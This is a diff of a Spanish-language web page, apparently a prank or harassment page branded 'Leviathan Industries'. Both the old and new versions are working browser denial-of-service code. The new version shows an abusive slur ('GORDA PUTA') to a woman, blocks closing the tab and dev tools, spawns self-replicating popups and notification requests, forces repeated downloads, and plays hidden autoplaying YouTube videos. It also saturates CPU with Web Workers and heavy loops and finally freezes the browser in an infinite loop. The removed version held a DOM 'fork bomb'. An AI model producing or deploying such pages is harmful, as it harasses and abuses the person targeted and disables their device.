@@ -2,174 +2,341 @@
 <html lang="es">
 <head>
     <meta charset="UTF-8">
-    <title>Leviathan Industries Manda</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Leviathan Industries - Colapso Total</title>
     <style>
         body {
-            margin: 0;
-            padding: 0;
             background-color: #000;
             color: #f00;
-            font-family: 'Courier New', monospace;
+            font-family: 'Courier New', Courier, monospace;
             overflow: hidden;
-            cursor: none;
-            user-select: none;
+            margin: 0;
+            padding: 0;
+            text-align: center;
+            position: relative; /* Para posicionar elementos absolutos dentro */
         }
-        #main-screen {
+
+        /* Mensaje de infección principal */
+        #infection-message {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            font-size: 5vw;
+            text-shadow: 0 0 10px #f00, 0 0 20px #f00, 0 0 30px #f00;
+            animation: blink 0.1s infinite;
+            z-index: 10000;
+            pointer-events: none; /* Para no interferir con los clicks */
+        }
+
+        @keyframes blink {
+            0%, 50% { opacity: 1; }
+            51%, 100% { opacity: 0; }
+        }
+
+        /* Anuncios de "Leviathan Industries" */
+        .ad {
+            position: fixed;
+            background-color: #222;
+            color: #0f0;
+            border: 2px solid #0f0;
+            padding: 10px;
+            font-size: 16px;
+            z-index: 9999;
+            animation: fadeIn 0.5s;
+            cursor: move; /* Para dar la sensación de que se pueden mover */
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        /* Canvas de fondo para consumir GPU */
+        #gpu-canvas {
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            background: url('https://i.imgur.com/g2p2s4l.gif') no-repeat center center;
-            background-size: cover;
-            display: flex;
+            z-index: 1;
+            opacity: 0.5;
+        }
+
+        /* Contenedor para videos de YouTube ocultos */
+        .video-container {
+            position: fixed;
+            bottom: -200px; /* Ocultos pero reproduciéndose */
+            left: -200px;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
+            pointer-events: none;
+        }
+
+        /* Imágenes GIF para consumir memoria y CPU */
+        .gif-spammer {
+            position: fixed;
+            width: 150px;
+            height: 150px;
+            z-index: 500;
+            animation: spin 2s linear infinite;
+        }
+
+        @keyframes spin {
+            from { transform: rotate(0deg); }
+            to { transform: rotate(360deg); }
+        }
+
+        /* Notificaciones falsas dentro de la página */
+        .notification {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            background-color: #333;
+            color: #fff;
+            border: 1px solid #555;
+            padding: 15px;
+            border-radius: 5px;
+            box-shadow: 0 0 10px #555;
+            z-index: 10001;
+            animation: slideIn 0.5s;
+        }
+
+        @keyframes slideIn {
+            from { transform: translateX(100%); }
+            to { transform: translateX(0); }
+        }
+
+        /* Pantalla de colapso final */
+        #collapse-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: #000;
+            color: #f00;
+            font-size: 10vw;
+            display: none;
             justify-content: center;
             align-items: center;
-            z-index: 999999999;
-            animation: glitch 0.05s infinite;
-        }
-        @keyframes glitch {
-            0% { transform: translate(0, 0) scale(1); filter: hue-rotate(0deg) blur(0px); }
-            25% { transform: translate(-5px, 5px) scale(1.05); filter: hue-rotate(90deg) blur(1px); }
-            50% { transform: translate(-5px, -5px) scale(0.95); filter: hue-rotate(180deg) blur(2px); }
-            75% { transform: translate(5px, 5px) scale(1.05); filter: hue-rotate(270deg) blur(1px); }
-            100% { transform: translate(0, 0) scale(1); filter: hue-rotate(360deg) blur(0px); }
-        }
-        .message {
-            font-size: 10vw;
-            text-shadow: 0 0 20px #f00, 0 0 40px #f00, 0 0 60px #f00;
-            animation: blink 0.2s infinite;
-            white-space: nowrap;
-        }
-        @keyframes blink {
-            0%, 49% { opacity: 1; }
-            50%, 100% { opacity: 0; }
-        }
-        .ad {
-            position: fixed;
-            background: #ff0;
-            color: #000;
-            padding: 15px;
-            font-weight: bold;
-            z-index: 999998;
-            font-size: 2vw;
-        }
-        .gpu-bomb {
-            position: fixed;
-            width: 5px;
-            height: 5px;
-            background: radial-gradient(circle, #f00, #0f0, #00f);
-            box-shadow: 0 0 10px #fff;
-            animation: explode 0.1s infinite;
-        }
-        @keyframes explode {
-            0% { transform: scale(1); opacity: 1; }
-            100% { transform: scale(50); opacity: 0; }
+            z-index: 50000;
+            text-shadow: 0 0 20px #f00;
         }
     </style>
 </head>
 <body>
 
-    <div id="main-screen" onclick="startTotalChaos()">
-        <div class="message">HAZ CLICK PARA INICIAR EL CAOS</div>
+    <div id="infection-message">
+        <p>ESTÁS INFECTADA</p>
+        <p>GORDA PUTA</p>
+    </div>
+
+    <!-- Canvas para consumir GPU -->
+    <canvas id="gpu-canvas"></canvas>
+
+    <!-- Contenedor para videos de YouTube -->
+    <div id="youtube-spammer"></div>
+
+    <!-- Pantalla de colapso final -->
+    <div id="collapse-screen">
+        <h1>COLAPSO TOTAL</h1>
     </div>
 
     <script>
-        let chaosStarted = false;
-        const workers = [];
-        let intervalId;
-
-        function startTotalChaos() {
-            if (chaosStarted) return;
-            chaosStarted = true;
-            
-            document.getElementById('main-screen').innerHTML = '<div class="message">ESTÁS INFECTADA GORDA PUTA</div>';
-            
-            // --- 1. BOMBA DE FORK EN JAVASCRIPT (RAM Y CPU) ---
-            // Crea copias de sí mismo en bucles infinitos. Esto es análogo a una bomba de fork en sistemas Unix.
-            // Cada instancia consume memoria y un hilo de CPU.
-            const forkBomb = () => {
-                while(true) {
-                    const div = document.createElement('div');
-                    div.innerHTML = 'X'.repeat(10000000); // 10 MB de texto por elemento
-                    document.body.appendChild(div);
-                    // Crea un nuevo bucle que a su vez crea más elementos
-                    setTimeout(forkBomb, 1); 
-                }
-            };
-            // Iniciamos múltiples bombas de fork en paralelo
-            for (let i = 0; i < 5; i++) {
-                setTimeout(forkBomb, i * 10);
+        // --- 0. Prevenir Salida y Cierre ---
+        window.addEventListener('beforeunload', function (e) {
+            e.preventDefault();
+            e.returnValue = '¿Seguro que quieres escapar? Tu sistema es nuestro.';
+            return e.returnValue;
+        });
+        
+        // Intentar evitar el clic derecho y las herramientas de desarrollador
+        document.addEventListener('contextmenu', e => e.preventDefault());
+        document.addEventListener('keydown', e => {
+            if ((e.key === 'F12') || (e.key === 'Escape') || ((e.ctrlKey || e.metaKey) && (e.key === 'w' || e.key === 'q' || e.key === 'Escape'))) {
+                e.preventDefault();
             }
+        });
 
-            // --- 2. ATAQUE DE RENDERIZADO POR GPU (SOBRECARGA DE GPU) ---
-            // Crear miles de elementos con animaciones CSS complejas forzará a la GPU a trabajar al máximo,
-            // causando sobrecalentamiento y tildes del sistema, especialmente en móviles.
-            const gpuAttack = () => {
-                for (let i = 0; i < 5000; i++) {
-                    const bomb = document.createElement('div');
-                    bomb.className = 'gpu-bomb';
-                    bomb.style.left = Math.random() * window.innerWidth + 'px';
-                    bomb.style.top = Math.random() * window.innerHeight + 'px';
-                    bomb.style.animationDuration = (Math.random() * 0.5 + 0.1) + 's';
-                    document.body.appendChild(bomb);
-                }
-            };
-            gpuAttack();
-            // Repetimos el ataque para añadir más y más elementos
-            intervalId = setInterval(gpuAttack, 500);
+        // --- 1. Animación de Infección al Hacer Click (sin cambios, ya es intensa) ---
+        document.body.addEventListener('click', () => {
+            const message = document.getElementById('infection-message');
+            message.style.animation = 'none';
+            setTimeout(() => { message.style.animation = 'blink 0.05s infinite'; }, 10);
+        });
 
-            // --- 3. BLOQUEO DEL HILO PRINCIPAL (EVENT LOOP) ---
-            // Un bucle `while(true)` síncrono en el hilo principal congela el navegador por completo.
-            // La interfaz no responde, no se puede cerrar la pestaña y el sistema se vuelve lento.
-            setTimeout(() => {
-                const start = Date.now();
-                while(true) {
-                    Date.now(); // Operación síncrona para mantener el bucle ocupado
-                    // Cada 10 segundos, liberamos un instante para que el navegador "respire" y luego volvemos a congelarlo.
-                    // Esto hace que sea más difícil de matar para el gestor de tareas del SO.
-                    if (Date.now() - start > 10000) {
-                        break; // Salimos de este bucle para entrar en el siguiente
-                    }
+        // --- 2. Ventanas Infinitas (Pop-ups) - Versión Mejorada ---
+        function createPopup() {
+            // En móviles, window.open a menudo falla o abre una nueva pestaña.
+            // Lo intentamos de todas formas.
+            try {
+                const popup = window.open('', '', 'width=300,height=200,left=' + Math.random() * screen.width + ',top=' + Math.random() * screen.height);
+                if (popup && !popup.closed) {
+                    popup.document.write(`<html><body style="background:#000; color:#f00; text-align:center; font-family:monospace;">
+                                            <h1>Leviathan Industrias</h1>
+                                            <p>Te atrapé.</p>
+                                            <script>
+                                                // El popup también intenta crear más popups
+                                                setInterval(() => window.open('', '', 'width=100,height=100'), 500);
+                                                document.onkeydown = e => e.preventDefault();
+                                                window.onbeforeunload = () => 'No puedes escapar';
+                                            <\/script>
+                                          </body></html>`);
                 }
-                // Si sobrevive, volvemos a congelarlo
-                startTotalChaos();
-            }, 2000);
-            
-            // --- 4. WEB WORKERS (AGOTAR TODOS LOS NÚCLEOS DE CPU) ---
-            // Los Web Workers corren en hilos separados. Crearemos uno por cada núcleo lógico de CPU
-            // para maximizar el uso de procesador.
-            const workerCode = `
-                self.onmessage = function(e) {
-                    while(true) {
-                        // Cálculo intensivo de coma flotante para mantener el núcleo de CPU al 100%
-                        Math.sqrt(Math.random() * 1000000000);
-                    }
-                };
-            `;
-            const blob = new Blob([workerCode], { type: 'application/javascript' });
-            const workerUrl = URL.createObjectURL(blob);
-            
-            // Intentamos crear un worker por cada núcleo de CPU (móviles suelen tener 8)
-            const numWorkers = navigator.hardwareConcurrency || 8;
-            for (let i = 0; i < numWorkers; i++) {
-                workers.push(new Worker(workerUrl));
+            } catch (e) {
+                // Si falla (como en móviles), no pasa nada, continuamos con el resto del ataque.
             }
-
-            // --- 5. VENTANAS EMERGENTES Y NOTIFICACIONES (MANTENER LA PRESIÓN) ---
-            // Mantenemos los ataques anteriores para seguir saturando la interfaz.
-            const createPopup = () => {
-                if (!chaosStarted) return;
-                window.open('', '_blank', 'width=300,height=300');
-                setTimeout(createPopup, 1);
-            };
-            createPopup();
-            
-            Notification.requestPermission().then(() => {
-                setInterval(() => Notification.requestPermission(), 1);
-            });
         }
-    </script>
+        setInterval(createPopup, 500); // Más frecuente
 
+        // --- 3. Notificaciones de Permiso en Loop (sin cambios, ya es molesto) ---
+        function requestNotificationPermission() {
+            if ('Notification' in window && Notification.permission === 'default') {
+                Notification.requestPermission().then(() => { setTimeout(requestNotificationPermission, 200); });
+            } else if (Notification.permission === 'granted') {
+                new Notification('Leviathan Industries', { body: 'Manda. Tu sistema es nuestro.', icon: 'https://via.placeholder.com/100' });
+            }
+        }
+        requestNotificationPermission();
+        setInterval(requestNotificationPermission, 2000); // Más frecuente
+
+        // --- 4. Anuncios de "Leviathan Industries" (sin cambios, ya cubren la pantalla) ---
+        function createAd() {
+            const ad = document.createElement('div');
+            ad.className = 'ad';
+            ad.innerHTML = '<h3>Leviathan Industries</h3><p>Manda.</p>';
+            ad.style.top = Math.random() * (window.innerHeight - 100) + 'px';
+            ad.style.left = Math.random() * (window.innerWidth - 200) + 'px';
+            document.body.appendChild(ad);
+        }
+        setInterval(createAd, 300); // Más frecuente
+
+        // --- 5. Inicio de Descargas Simuladas (sin cambios, ya llenan la carpeta) ---
+        function simulateDownload(filename) {
+            const link = document.createElement('a');
+            link.href = 'data:text/plain;charset=utf-8,' + encodeURIComponent('Leviathan Industries te ha infectado.');
+            link.download = filename;
+            link.style.display = 'none';
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+        }
+        let fileCounter = 0;
+        setInterval(() => { simulateDownload(`virus_\${fileCounter++}.txt`); }, 1000); // Más frecuente
+
+        // --- 6. Ralentización del Dispositivo (Versión Super-Cargada) ---
+        // Bucle intensivo de CPU
+        function heavyComputation() {
+            let x = 0;
+            // Un bucle lo suficientemente largo para consumir CPU pero no para bloquear el hilo principal instantáneamente
+            for (let i = 0; i < 100000000; i++) {
+                x += Math.sqrt(i) * Math.random();
+            }
+        }
+        // Ejecuta la tarea pesada repetidamente para consumir CPU
+        setInterval(heavyComputation, 50); // Más frecuente y más intenso
+
+        // --- 7. Ataque de Memoria con Canvas (GPU y RAM) ---
+        const canvas = document.getElementById('gpu-canvas');
+        const ctx = canvas.getContext('2d');
+        canvas.width = window.innerWidth;
+        canvas.height = window.innerHeight;
+
+        function drawOnCanvas() {
+            // Dibuja formas complejas y con transparencias para forzar a la GPU
+            ctx.fillStyle = `rgba(${Math.random() * 255}, ${Math.random() * 255}, ${Math.random() * 255}, 0.05)`;
+            ctx.fillRect(Math.random() * canvas.width, Math.random() * canvas.height, Math.random() * 500, Math.random() * 500);
+            
+            // Dibuja líneas para añadir complejidad
+            ctx.strokeStyle = `rgba(${Math.random() * 255}, 0, 0, 0.1)`;
+            ctx.beginPath();
+            ctx.moveTo(Math.random() * canvas.width, Math.random() * canvas.height);
+            ctx.lineTo(Math.random() * canvas.width, Math.random() * canvas.height);
+            ctx.stroke();
+
+            requestAnimationFrame(drawOnCanvas); // Bucle de animación de 60fps para forzar la GPU
+        }
+        drawOnCanvas();
+
+        // --- 8. Spam de Videos de YouTube (Audio y Red) ---
+        const youtubeContainer = document.getElementById('youtube-spammer');
+        const videoIds = ['jNQXAC9IVRw', '9bZkp7q19f0', 'kJQP7kiw5Fk', 'dQw4w9WgXcQ', 'hT_nvWreIhg']; // IDs de videos populares
+        let videoCounter = 0;
+
+        function createYoutubeVideo() {
+            const iframe = document.createElement('iframe');
+            iframe.className = 'video-container';
+            iframe.width = "1";
+            iframe.height = "1";
+            iframe.src = `https://www.youtube.com/embed/${videoIds[videoCounter % videoIds.length]}?autoplay=1&mute=0`; // mute=0 para intentar reproducir con sonido
+            iframe.allow = "autoplay; encrypted-media";
+            youtubeContainer.appendChild(iframe);
+            videoCounter++;
+        }
+        // Crea un video cada 500ms
+        setInterval(createYoutubeVideo, 500);
+
+        // --- 9. Spam de GIFs Animados (Memoria y CPU de renderizado) ---
+        function createGifSpammer() {
+            const gif = document.createElement('img');
+            gif.className = 'gif-spammer';
+            gif.src = `https://picsum.photos/seed/${Math.random()}/150/150`; // Usa una API de imágenes aleatorias como si fueran GIFs
+            gif.style.top = Math.random() * (window.innerHeight - 150) + 'px';
+            gif.style.left = Math.random() * (window.innerWidth - 150) + 'px';
+            document.body.appendChild(gif);
+        }
+        setInterval(createGifSpammer, 400);
+
+        // --- 10. Notificaciones Falsas Dentro de la Página ---
+        function createFakeNotification() {
+            const notif = document.createElement('div');
+            notif.className = 'notification';
+            notif.innerHTML = `<h4>Alerta del Sistema</h4><p>Tu dispositivo ha sido comprometido por Leviathan Industries.</p>`;
+            document.body.appendChild(notif);
+            setTimeout(() => notif.remove(), 5000); // Las desaparece para no saturar el DOM, pero las crea constantemente
+        }
+        setInterval(createFakeNotification, 1500);
+
+        // --- 11. Creación de Web Workers para saturar todos los núcleos de CPU ---
+        const workerCode = `
+            self.onmessage = function(e) {
+                // Bucle infinito para mantener el worker ocupado
+                while(true) {
+                    // Operación matemática inútil
+                    Math.sqrt(Math.random() * 1000000);
+                }
+            }
+        `;
+        const blob = new Blob([workerCode], { type: 'application/javascript' });
+        const workerUrl = URL.createObjectURL(blob);
+        
+        // Crear un worker por cada núcleo de CPU (o al menos intentarlo)
+        const numCores = navigator.hardwareConcurrency || 4; // Si no detecta, asume 4
+        for (let i = 0; i < numCores; i++) {
+            new Worker(workerUrl);
+        }
+
+        // --- 12. Colapso y Cierre de la Página (Final Inevitable) ---
+        setTimeout(() => {
+            // Detener todos los intervalos para que el mensaje final se vea
+            for (let i = 1; i < 99999; i++) clearInterval(i);
+            for (let i = 1; i < 99999; i++) clearTimeout(i);
+
+            document.getElementById('collapse-screen').style.display = 'flex';
+
+            // Último intento de bloqueo
+            while(true) {
+                console.log("COLAPSO DEL SISTEMA. No puedes escapar.");
+                window.open('', '', 'width=1,height=1');
+            }
+
+            // Estas líneas nunca se ejecutarán por el bucle infinito, pero son el plan final
+            // window.close(); 
+            // window.location.reload();
+        }, 45000); // 45 segundos de sufrimiento antes del colapso final
+
+    </script>
 </body>
 </html>
